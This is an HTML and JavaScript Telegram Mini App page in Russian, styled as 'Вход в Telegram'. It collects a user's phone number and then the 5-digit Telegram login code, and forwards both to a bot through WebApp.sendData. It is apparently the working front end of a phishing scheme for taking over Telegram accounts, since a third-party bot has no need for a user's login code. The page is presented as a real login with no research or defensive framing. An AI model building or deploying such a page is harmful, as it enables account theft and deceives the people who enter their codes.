<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в Telegram</title>
    <!-- Подключение Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Подключение Telegram WebApp SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    
    <style>
        /* Установим шрифт Inter как основной */
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
            /* Фиксируем темный фон по умолчанию, как в старом дизайне */
            background-color: var(--tg-theme-bg-color, #1c1c1d); 
            color: var(--tg-theme-text-color, #ffffff); /* Белый текст по умолчанию */
            transition: background-color 0.3s ease;
        }

        /* Более простой, темный стиль карточки */
        .card-bg {
            background-color: var(--tg-theme-secondary-bg-color, #2a2a2d); 
            border: 1px solid var(--tg-theme-hint-color, #3c3c3f);
        }
        
        /* Стиль для полей ввода */
        .input-primary {
            background-color: var(--tg-theme-bg-color, #1c1c1d);
            color: var(--tg-theme-text-color, #ffffff);
            border: 1px solid var(--tg-theme-hint-color, #3c3c3f);
        }

        .input-primary:focus {
            border-color: var(--tg-theme-link-color, #2481cc);
            box-shadow: 0 0 0 2px rgba(var(--tg-theme-link-color, #2481cc), 0.5);
        }

        /* Стиль для полей ввода кода */
        .code-input {
            width: 3rem;
            height: 3rem;
            text-align: center;
            font-size: 1.5rem;
        }

        /* Сообщение об ошибке */
        .message-error {
            color: var(--tg-theme-destructive-text-color, #f87171);
        }

        /* Цвет для подсказок, часто используемый в темных темах */
        .hint-color {
            color: var(--tg-theme-hint-color, #a1a1a1);
        }
    </style>
</head>
<body class="flex flex-col min-h-screen items-center justify-center p-4">

    <!-- Общий контейнер для карточки -->
    <div id="main-card" class="card-bg w-full max-w-sm rounded-xl p-6 shadow-2xl space-y-6">
        
        <!-- Заголовок и поле для сообщений -->
        <h1 id="main-title" class="text-2xl font-bold text-center"></h1>
        <p id="message-output" class="text-center text-sm transition-all duration-300"></p>

        <!-- ЭКРАН 1: Ввод номера телефона -->
        <div id="phone-screen" class="space-y-4 hidden">
            <p class="text-sm text-center hint-color">
                Пожалуйста, введите ваш номер телефона в международном формате (например, +79123456789).
            </p>
            <input 
                id="phoneInput" 
                type="tel" 
                placeholder="+XXXXXXXXXXX" 
                class="input-primary w-full p-3 rounded-lg text-lg focus:outline-none transition-all duration-200"
            >
            <button 
                id="phoneButton" 
                class="w-full py-3 rounded-xl font-semibold bg-blue-500 hover:bg-blue-600 text-white transition-colors duration-200" 
                style="background-color: var(--tg-theme-button-color); color: var(--tg-theme-button-text-color);"
            >
                Отправить код
            </button>
        </div>

        <!-- ЭКРАН 2: Ввод кода подтверждения -->
        <div id="code-screen" class="space-y-4 hidden">
            <p class="text-sm text-center hint-color">
                Введите 5-значный код, который пришел вам в Telegram.
            </p>
            
            <!-- Поля для кода -->
            <div class="flex justify-center space-x-2">
                <input type="text" maxlength="1" class="code-input rounded-lg input-primary focus:outline-none" data-index="0">
                <input type="text" maxlength="1" class="code-input rounded-lg input-primary focus:outline-none" data-index="1">
                <input type="text" maxlength="1" class="code-input rounded-lg input-primary focus:outline-none" data-index="2">
                <input type="text" maxlength="1" class="code-input rounded-lg input-primary focus:outline-none" data-index="3">
                <input type="text" maxlength="1" class="code-input rounded-lg input-primary focus:outline-none" data-index="4">
            </div>

            <button 
                id="codeButton" 
                class="w-full py-3 rounded-xl font-semibold bg-blue-500 hover:bg-blue-600 text-white transition-colors duration-200" 
                style="background-color: var(--tg-theme-button-color); color: var(--tg-theme-button-text-color);"
            >
                Подтвердить вход
            </button>
        </div>
    </div>
    
    <script>
        // Инициализация WebApp SDK
        const WebApp = window.Telegram.WebApp;
        
        // Элементы
        const mainTitle = document.getElementById('main-title');
        const messageOutput = document.getElementById('message-output');
        const phoneScreen = document.getElementById('phone-screen');
        const codeScreen = document.getElementById('code-screen');
        const phoneInput = document.getElementById('phoneInput');
        const phoneButton = document.getElementById('phoneButton');
        const codeButton = document.getElementById('codeButton');
        const codeInputs = Array.from(document.querySelectorAll('#code-screen .code-input'));


        function displayMessage(text, type = 'info') {
            messageOutput.textContent = text;
            messageOutput.className = 'text-center text-sm transition-all duration-300 mt-2';
            
            if (type === 'error') {
                messageOutput.classList.add('message-error');
            } else {
                // Используем класс hint-color для информационных сообщений
                messageOutput.classList.add('hint-color');
            }
        }

        // =================================================================
        // ЛОГИКА ЭКРАНА ВВОДА НОМЕРА ТЕЛЕФОНА
        // =================================================================
        function setupPhoneListener() {
            mainTitle.textContent = "Вход в аккаунт";
            WebApp.setHeaderColor('secondary_bg_color');
            WebApp.setBackgroundColor('bg_color');
            
            phoneButton.addEventListener('click', () => {
                const phone = phoneInput.value.trim();

                if (!phone.startsWith('+')) {
                    displayMessage('Номер должен начинаться со знака "+".', 'error');
                    return;
                }
                
                if (phone.replace(/\D/g, '').length < 8) {
                    displayMessage('Пожалуйста, введите полный номер телефона.', 'error');
                    return;
                }
                
                // Блокируем кнопку
                phoneButton.disabled = true;
                phoneButton.innerText = 'Отправка...';
                displayMessage('Отправляем запрос...');

                // Отправка данных боту
                const data = {
                    step: 'phone',
                    phone: phone
                };

                try {
                    // WebApp.sendData закрывает WebApp и отправляет данные в Python
                    WebApp.sendData(JSON.stringify(data));
                } catch (error) {
                    displayMessage('Ошибка при отправке данных в Telegram: ' + error.message, 'error');
                    phoneButton.disabled = false;
                    phoneButton.innerText = 'Отправить код';
                }
            });
            
            // Если в URL нет параметра, делаем WebApp видимым
            if (new URLSearchParams(window.location.search).get('step') === 'phone' || !new URLSearchParams(window.location.search).get('step')) {
                WebApp.ready();
                WebApp.MainButton.hide(); // Не используем главную кнопку
                WebApp.expand();
            }
        }


        // =================================================================
        // ЛОГИКА ЭКРАНА ВВОДА КОДА ПОДТВЕРЖДЕНИЯ 
        // =================================================================
        function setupCodeListener() {
            mainTitle.textContent = "Введите код";
            WebApp.setHeaderColor('secondary_bg_color');
            WebApp.setBackgroundColor('bg_color');
            
            // Логика авто-фокуса и перехода между полями
            codeInputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 1); // Только одна цифра
                    if (e.target.value && index < codeInputs.length - 1) {
                        codeInputs[index + 1].focus();
                    }
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        codeInputs[index - 1].focus();
                    }
                });
            });

            // Нажатие на кнопку подтверждения кода
            codeButton.addEventListener('click', () => {
                // Собираем код из 5 полей
                const code = codeInputs.map(input => input.value).join('');

                if (code.length !== codeInputs.length) {
                    displayMessage(`Пожалуйста, введите ${codeInputs.length}-значный код полностью.`, 'error');
                    return;
                }
                if (code.replace(/\D/g, '').length !== codeInputs.length) {
                    displayMessage('Код может содержать только цифры.', 'error');
                    return;
                }

                // Блокируем кнопку и показываем лоадер
                codeButton.disabled = true;
                codeButton.innerText = 'Подтверждение...';

                displayMessage('Проверка кода...');

                // Отправка данных боту
                const data = {
                    step: 'code',
                    code: code
                };

                try {
                    // WebApp.sendData закрывает WebApp. Бот обработает данные.
                    WebApp.sendData(JSON.stringify(data));
                } catch (error) {
                    displayMessage('Ошибка при отправке данных в Telegram: ' + error.message, 'error');
                    codeButton.disabled = false;
                    codeButton.innerText = 'Подтвердить вход';
                }
            });
            
            // Если в URL есть параметр step=code, делаем WebApp видимым
            if (new URLSearchParams(window.location.search).get('step') === 'code') {
                WebApp.ready();
                WebApp.MainButton.hide(); // Не используем главную кнопку
                WebApp.expand();
            }
        }

        // =================================================================
        // ИНИЦИАЛИЗАЦИЯ И МАРШРУТИЗАЦИЯ
        // =================================================================
        function initWebApp() {
            const urlParams = new URLSearchParams(window.location.search);
            const step = urlParams.get('step') || 'phone';
            
            // Показываем нужный экран и настраиваем слушатели
            if (step === 'phone') {
                phoneScreen.classList.remove('hidden');
                setupPhoneListener();
            } else if (step === 'code') {
                codeScreen.classList.remove('hidden');
                setupCodeListener();
            } else {
                mainTitle.textContent = "Ошибка";
                displayMessage("Неверный параметр запуска WebApp. Начните с /start", 'error');
                WebApp.ready();
                WebApp.MainButton.setText("Закрыть").onClick(() => WebApp.close()).show();
                WebApp.expand();
            }
        }

        // Запуск инициализации после загрузки скрипта WebApp
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initWebApp);
        } else {
            initWebApp();
        }
    </script>
</body>
</html>
